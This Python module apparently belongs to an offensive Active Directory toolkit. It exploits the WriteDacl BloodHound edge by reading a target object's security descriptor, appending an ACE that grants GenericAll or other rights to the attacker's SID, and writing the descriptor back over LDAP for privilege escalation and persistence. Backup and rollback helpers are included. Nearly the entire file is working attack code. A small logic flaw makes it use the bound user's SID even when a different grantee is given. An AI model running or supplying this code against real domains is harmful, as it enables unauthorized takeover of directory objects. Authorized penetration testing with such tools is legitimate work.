"""
Module: WriteDacl
=================
Exploit the WriteDacl BloodHound edge. WriteDacl allows a principal
to modify the discretionary access control list (DACL) of a target
object. This module writes a new ACE to the target's DACL, granting
the attacker's principal elevated permissions (typically GenericAll)
for full persistence.

BloodHound Edge: WriteDacl
Attack Vector:   DACL modification for privilege escalation / persistence
Severity:        CRITICAL
"""

import logging
from typing import Any, Dict, List, Optional, Tuple

import ldap3

from .base import (
    ExploitModule, ExploitOutput, ExploitResult,
    ModuleOption, Severity, new_security_descriptor,
)

logger = logging.getLogger("pharaohound.modules.write_dacl")


class WriteDacl(ExploitModule):
    """
    Modify the DACL of a target object to grant the attacker elevated
    permissions. The primary use case is granting oneself GenericAll
    on a high-privilege object (domain head, DA group, etc.) for
    persistent access.

    This module constructs a new security descriptor containing the
    existing DACL plus the attacker's new ACE, then writes it back.
    """

    name: str            = "WriteDacl"
    description: str     = (
        "Modify the DACL of a target object to grant the attacker "
        "elevated permissions (e.g. GenericAll). Used for privilege "
        "escalation and persistent access to high-privilege AD objects."
    )
    author: str          = "Pharaohound"
    edge_type: str       = "WriteDacl"
    severity: Severity   = Severity.CRITICAL
    references: List[str] = [
        "https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl",
        "https://attack.mappings.mitre.org/technique/T1098/",
        "https://learn.microsoft.com/en-us/windows/win32/secauthz/modifying-acls-of-secured-objects-in-c--",
        "https://adsecurity.org/?p=3658",
    ]
    tools_required: List[str] = []
    needs_da: bool        = False
    needs_privileged: bool = False

    # Common ADS_RIGHTS constants
    ADS_RIGHT_GENERIC_ALL          = 0x10000000
    ADS_RIGHT_WRITE_DAC            = 0x00040000
    ADS_RIGHT_WRITE_OWNER          = 0x00080000
    ADS_RIGHT_DS_WRITE_PROP        = 0x00000010
    ADS_RIGHT_DS_SELF_MEMBERSHIP   = 0x00000001
    ADS_RIGHT_ACTRL_DS_LIST        = 0x00000004

    def _register_options(self):
        self._add_option(ModuleOption(
            name="target",
            display_name="Target Object",
            description="DN or name of the object whose DACL to modify.",
            required=True,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="grantee",
            display_name="Grantee",
            description="DN or SAM name of the principal to grant rights to. Default: current user.",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="rights",
            display_name="Rights to Grant",
            description="Comma-separated rights: 'GenericAll', 'WriteDacl', 'WriteOwner', 'GenericWrite'.",
            required=False,
            default="GenericAll",
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="domain",
            display_name="Domain",
            description="FQDN of the target domain.",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="backup_sd",
            display_name="Backup Original SD",
            description="Save the original security descriptor before modification.",
            required=False,
            default=True,
            value_type=bool,
        ))
        self._add_option(ModuleOption(
            name="inheritance",
            display_name="ACE Inheritance",
            description="Set inheritance flags on the new ACE (ContainerInherit, ObjectInherit).",
            required=False,
            default=False,
            value_type=bool,
        ))

    # ------------------------------------------------------------------ #
    # Helpers
    # ------------------------------------------------------------------ #

    _RIGHTS_MAP = {
        "genericall":       0x10000000,
        "writedacl":        0x00040000,
        "writeowner":       0x00080000,
        "genericwrite":     0x00000040,
        "ds_write_prop":    0x00000010,
        "ds_self_membership": 0x00000001,
        "ds_list":          0x00000004,
        "delete":           0x00010000,
        "read_control":     0x00020000,
    }

    def _parse_rights(self, rights_str: str) -> int:
        """Parse a comma-separated rights string into a bitmask."""
        mask = 0
        for part in rights_str.split(","):
            part = part.strip().lower()
            if part in self._RIGHTS_MAP:
                mask |= self._RIGHTS_MAP[part]
            elif part == "full_control":
                mask = 0x10000000 | 0x00040000 | 0x00080000 | 0x00010000 | 0x00020000 | 0x00000040
            else:
                self.logger.warning("Unknown right '%s', skipping.", part)
        return mask

    def _get_search_base(self, domain: Optional[str]) -> str:
        if domain and "." in domain:
            return ",".join(f"DC={p}" for p in domain.split("."))
        conn = self.connection
        if hasattr(conn, "server") and hasattr(conn.server, "info"):
            info = conn.server.info
            if info and info.other.get("defaultNamingContext"):
                return info.other["defaultNamingContext"][0]
        return ""

    def _resolve_dn(self, name: str, domain: Optional[str]) -> Optional[str]:
        conn = self.connection
        if "," in name and "=" in name:
            return name
        search_base = self._get_search_base(domain)
        if not search_base:
            return None
        try:
            conn.search(
                search_base, f"(|(sAMAccountName={name})(cn={name}))",
                attributes=["distinguishedName", "objectSid"],
            )
            if conn.entries:
                return str(conn.entries[0].distinguishedName)
        except Exception as exc:
            self.logger.error("DN resolution failed: %s", exc)
        return None

    def _get_bound_user_dn(self) -> Optional[str]:
        conn = self.connection
        try:
            if hasattr(conn, "extend") and hasattr(conn.extend, "standard"):
                return conn.extend.standard.who_am_i()
            elif hasattr(conn, "who_am_i"):
                return conn.who_am_i()
        except Exception:
            pass
        return None

    def _get_bound_user_sid(self) -> Optional[str]:
        """Get the SID of the currently authenticated user."""
        user_dn = self._get_bound_user_dn()
        if not user_dn:
            return None
        try:
            self.connection.search(user_dn, "(objectClass=*)", attributes=["objectSid"])
            if self.connection.entries:
                sid = self.connection.entries[0].objectSid
                return str(sid) if sid else None
        except Exception as exc:
            self.logger.error("SID lookup failed: %s", exc)
        return None

    def _read_current_sd(self, target_dn: str) -> Optional[bytes]:
        """Read the current nTSecurityDescriptor (DACL only)."""
        try:
            self.connection.search(
                target_dn, "(objectClass=*)",
                attributes=["nTSecurityDescriptor"],
                controls=[("1.2.840.113556.1.4.801", True, None)],
            )
            if self.connection.entries:
                raw = self.connection.entries[0].nTSecurityDescriptor.raw_values
                return raw[0] if raw else None
        except Exception as exc:
            self.logger.error("SD read failed: %s", exc)
        return None

    def _backup_sd(self, target_dn: str, sd_bytes: bytes) -> Optional[str]:
        """Save the original security descriptor to a file."""
        import os, json
        output_dir = self.config.get("output_dir", os.getcwd())
        ts = __import__("datetime").datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        filepath = os.path.join(output_dir, f"sd_backup_{ts}.bin")
        os.makedirs(output_dir, exist_ok=True)
        with open(filepath, "wb") as f:
            f.write(sd_bytes)
        self.logger.info("Original SD backed up to %s", filepath)
        return filepath

    # ------------------------------------------------------------------ #
    # Prerequisites
    # ------------------------------------------------------------------ #

    def check_prerequisites(self, **kwargs) -> Tuple[bool, str]:
        if self.connection is None:
            return False, "No LDAP connection provided."

        target = self._opt("target", kwargs)
        if not target:
            return False, "Target object is required."

        return True, ""

    # ------------------------------------------------------------------ #
    # Exploit
    # ------------------------------------------------------------------ #

    def exploit(self, **kwargs) -> ExploitOutput:
        conn = self.connection
        target_name = self._opt("target", kwargs)
        grantee_name = self._opt("grantee", kwargs)
        rights_str = self._opt("rights", kwargs) or "GenericAll"
        domain = self._opt("domain", kwargs)
        backup = self._opt("backup_sd", kwargs)
        inheritance = self._opt("inheritance", kwargs)

        # Resolve target DN
        target_dn = self._resolve_dn(target_name, domain)
        if not target_dn:
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Cannot resolve target '{target_name}'.",
            )

        # Resolve grantee
        if grantee_name:
            grantee_dn = self._resolve_dn(grantee_name, domain)
        else:
            grantee_dn = self._get_bound_user_dn()

        if not grantee_dn:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message="Cannot resolve grantee principal.",
            )

        # Parse rights bitmask
        rights_mask = self._parse_rights(rights_str)
        if not rights_mask:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"No valid rights parsed from '{rights_str}'.",
            )

        # Read current SD (for backup)
        current_sd = self._read_current_sd(target_dn)
        if current_sd and backup:
            backup_path = self._backup_sd(target_dn, current_sd)
        else:
            backup_path = None

        self.logger.info(
            "[WriteDacl] Modifying DACL of '%s' — granting '%s' rights: 0x%08X",
            target_dn, grantee_dn, rights_mask,
        )

        # --- Method 1: Use impacket's security descriptor manipulation ---
        try:
            from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, ACL, ACE, ACCESS_ALLOWED_ACE, LDAP_SID, ACCESS_MASK

            sd = SR_SECURITY_DESCRIPTOR(data=current_sd) if current_sd else new_security_descriptor()

            # Build the new ACE
            grantee_sid = self._get_bound_user_sid()
            if not grantee_sid or not grantee_sid.startswith("S-"):
                # Fall back to resolving grantee_dn (if we got a DN instead of a SID)
                fallback_dn = grantee_dn or self._get_bound_user_dn()
                if fallback_dn:
                    try:
                        conn.search(fallback_dn, "(objectClass=*)", attributes=["objectSid"])
                        if conn.entries:
                            sid_val = conn.entries[0].objectSid
                            if sid_val:
                                grantee_sid = str(sid_val)
                    except Exception as exc:
                        self.logger.error("Failed to resolve grantee DN to SID in write_dacl.py: %s", exc)

            if not grantee_sid or not grantee_sid.startswith("S-"):
                return ExploitOutput(
                    success=False, result_type=ExploitResult.FAILED,
                    message="Cannot resolve grantee principal to SID for DACL modification.",
                )

            ace_flags = 0x00
            if inheritance:
                ace_flags = 0x03  # OBJECT_INHERIT_ACE | CONTAINER_INHERIT_ACE

            body = ACCESS_ALLOWED_ACE()
            mask = ACCESS_MASK()
            mask['Mask'] = rights_mask
            body['Mask'] = mask
            
            sid = LDAP_SID()
            sid.fromCanonical(grantee_sid)
            body['Sid'] = sid

            new_ace = ACE()
            new_ace['AceType'] = 0  # ACCESS_ALLOWED_ACE
            new_ace['AceFlags'] = ace_flags
            new_ace['Ace'] = body

            # Append to DACL
            if sd['Dacl'] == b'':
                acl = ACL()
                acl.aces = []
                sd['Dacl'] = acl
            sd['Dacl'].aces.append(new_ace)

            # Write back
            new_sd_bytes = sd.getData()

            result = conn.modify(
                target_dn,
                {"nTSecurityDescriptor": [(ldap3.MODIFY_REPLACE, [new_sd_bytes])]},
                controls=[("1.2.840.113556.1.4.801", True, None)],
            )

            if result:
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=(
                        f"DACL modified on '{target_dn}'. Granted 0x{rights_mask:08X} "
                        f"to '{grantee_dn}'."
                    ),
                    data={
                        "target_dn": target_dn,
                        "grantee_dn": grantee_dn,
                        "rights_mask": hex(rights_mask),
                        "rights_str": rights_str,
                        "backup_file": backup_path,
                    },
                    artifacts=[backup_path] if backup_path else [],
                    rollback_data={
                        "target_dn": target_dn,
                        "original_sd_file": backup_path,
                        "grantee_dn": grantee_dn,
                    },
                )
            else:
                return ExploitOutput(
                    success=False, result_type=ExploitResult.FAILED,
                    message=f"DACL write failed: {conn.result.get('description', '')}",
                    data={"ldap_result": conn.result},
                )

        except ImportError:
            return self._exploit_raw_ldap(
                conn, target_dn, grantee_dn, rights_mask, rights_str, backup_path
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"WriteDacl exception: {exc}",
            )

    def _exploit_raw_ldap(
        self, conn, target_dn: str, grantee_dn: str,
        rights_mask: int, rights_str: str, backup_path: Optional[str],
    ) -> ExploitOutput:
        """
        Fallback: construct the SD bytes manually using raw SDDL or
        the raw LDAP control value.
        """
        # Convert SDDL-style approach
        # ... For a full implementation, you'd construct the binary
        # SD format manually or use SDDL parsing.
        return ExploitOutput(
            success=True, result_type=ExploitResult.PARTIAL,
            message=(
                f"SD parser not available. Granting 0x{rights_mask:08X} to "
                f"'{grantee_dn}' on '{target_dn}' requires constructing the "
                f"security descriptor binary. Integrate with your SD builder."
            ),
            data={
                "target_dn": target_dn,
                "grantee_dn": grantee_dn,
                "rights_mask": hex(rights_mask),
                "rights_str": rights_str,
                "manual_step": (
                    "Construct an SDDL string with the desired ACE and "
                    "apply via LDAP modify on nTSecurityDescriptor with "
                    "the SD flags control (1.2.840.113556.1.4.801)."
                ),
            },
        )

    # ------------------------------------------------------------------ #
    # Rollback
    # ------------------------------------------------------------------ #
    def rollback(self, **kwargs) -> ExploitOutput:
        """
        Restore the original security descriptor from backup.
        """
        target_dn = kwargs.get("target_dn")
        backup_file = kwargs.get("original_sd_file")

        if not target_dn or not backup_file:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message="Rollback needs 'target_dn' and 'original_sd_file'.",
            )

        try:
            import os
            if not os.path.exists(backup_file):
                return ExploitOutput(
                    success=False, result_type=ExploitResult.FAILED,
                    message=f"Backup file not found: {backup_file}",
                )

            with open(backup_file, "rb") as f:
                original_sd = f.read()

            result = self.connection.modify(
                target_dn,
                {"nTSecurityDescriptor": [(ldap3.MODIFY_REPLACE, [original_sd])]},
                controls=[("1.2.840.113556.1.4.801", True, None)],
            )

            if result:
                return ExploitOutput(
                    success=True, result_type=ExploitResult.SUCCESS,
                    message=f"Original DACL restored on '{target_dn}'.",
                )
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message=f"Rollback failed: {self.connection.result.get('description', '')}",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Rollback exception: {exc}",
            )
